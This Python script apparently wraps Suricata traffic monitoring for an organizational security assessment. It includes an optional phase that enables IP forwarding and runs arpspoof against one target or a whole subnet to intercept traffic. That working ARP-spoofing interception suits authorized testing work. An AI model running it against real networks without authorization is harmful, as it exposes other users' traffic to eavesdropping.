import os
import sys
import time
import subprocess
from datetime import datetime

def log(msg, level="INFO"):
    colors = {
        "INFO": "\033[94m",   # Blue
        "SUCCESS": "\033[92m",# Green
        "WARN": "\033[93m",   # Yellow
        "ERROR": "\033[91m",  # Red
        "RESET": "\033[0m"    # Reset
    }
    color = colors.get(level, colors["INFO"])
    print(f"{color}[{level}] {msg}{colors['RESET']}")

def setup_output_dir(org_name):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    base_out_dir = os.path.abspath(os.path.join(script_dir, "output", org_name, "out_data_transfer"))
    os.makedirs(base_out_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(base_out_dir, f"data_transfer_logs_{timestamp}")
    try:
        os.makedirs(out_dir, exist_ok=True)
        log(f"Created output directory: {out_dir}", "SUCCESS")
        return out_dir
    except Exception as e:
        log(f"Failed to create directory '{out_dir}': {e}", "ERROR")
        sys.exit(1)

def set_ip_forwarding(enable=True):
    val = "1" if enable else "0"
    state = "Enabling" if enable else "Disabling"
    log(f"{state} IP Forwarding...", "INFO")
    try:
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True, check=True)
    except Exception as e:
        log(f"Failed to set IP forwarding. Interception might drop victim's internet: {e}", "WARN")

def start_arp_spoofing(interface, gateway_ip, target_ip=""):
    procs = []
    try:
        subprocess.run(["arpspoof", "-h"], capture_output=True)
        
        log(f"Initiating ARP Spoofing on {interface} to intercept traffic...", "WARN")
        
        if target_ip:
            log(f"  --> Spoofing specific Target: {target_ip} <--> Gateway: {gateway_ip}", "WARN")
            p1 = subprocess.Popen(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            p2 = subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs.extend([p1, p2])
        else:
            log(f"  --> Spoofing ENTIRE SUBNET <--> Gateway: {gateway_ip}", "WARN")
            p1 = subprocess.Popen(["arpspoof", "-i", interface, gateway_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs.append(p1)
            
        log("ARP Spoofing is now running actively in the background.", "SUCCESS")
        return procs
        
    except FileNotFoundError:
        log("'arpspoof' is missing! Install via 'sudo apt install dsniff'. Suricata will only log local traffic.", "ERROR")
        return []

def stop_arp_spoofing(procs):
    if procs:
        log("Stopping active interception (ARP Spoofing) and cleaning up...", "INFO")
        for p in procs:
            p.terminate()
            p.wait(timeout=5)
        log("Target traffic routing restored to normal.", "SUCCESS")

def main():
    print("==========================================================")
    print("      Data Transfer Monitoring Wrapper - Suricata         ")
    print("==========================================================")
    
    if hasattr(os, 'geteuid') and os.geteuid() != 0:
        log("WARNING: This script highly depends on raw access to interfaces. It should be run as root (sudo).", "WARN")
        time.sleep(2)
        
    arpspoof_procs = []
    is_spoofing = False
    
    try:
        org_name = input("\nEnter the organization name in which the assessment is performed: ").strip().replace(" ", "_")
        if not org_name:
            org_name = "Unknown_Org"
            
        interface = input("\nEnter network interface to monitor (e.g., eth0, wlan0) [default: eth0]: ").strip()
        if not interface:
            interface = "eth0"
            log(f"No interface provided, defaulting to {interface}", "INFO")
            
        duration_input = input("Enter duration to monitor in minutes [default: 5]: ").strip()
        duration_mins = int(duration_input) if duration_input.isdigit() else 5
        
        print("\n--- Phase 1: Network Setup ---")
        spoof_choice = input("Enable Active ARP Spoofing to intercept WHOLE network traffic? (y/N): ").strip().lower()
        if spoof_choice == 'y':
            gateway_ip = input("  Enter the Router/Gateway IP (e.g., 192.168.1.1): ").strip()
            target_ip = input("  Enter the Target IP (leave empty to intercept ALL subnet traffic): ").strip()
            
            if gateway_ip:
                is_spoofing = True
                set_ip_forwarding(enable=True)
                arpspoof_procs = start_arp_spoofing(interface, gateway_ip, target_ip)
            else:
                log("Router/Gateway IP is absolutely required to arp spoof. Bypassing interception.", "WARN")
        
        out_dir = setup_output_dir(org_name)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        print("\n--- Phase 2: Live Monitoring ---")
        suricata_script = os.path.join(script_dir, "suricata_scan.py")
        if os.path.exists(suricata_script):
            subprocess.run([sys.executable, suricata_script, "--out-dir", out_dir, "--interface", interface, "--duration-mins", str(duration_mins)])
        else:
            log("suricata_scan.py not found.", "ERROR")
        
        print("\n==========================================================")
        log(f"Monitoring Phase complete! Results in '{os.path.abspath(out_dir)}'", "SUCCESS")
        
    except KeyboardInterrupt:
        print("\n")
        log("Monitoring forcefully interrupted by user.", "WARN")
    finally:
        if is_spoofing:
            print("\n--- Clean-up Phase ---")
            stop_arp_spoofing(arpspoof_procs)
            set_ip_forwarding(enable=False)
            
        sys.exit(0)

if __name__ == "__main__":
    main()
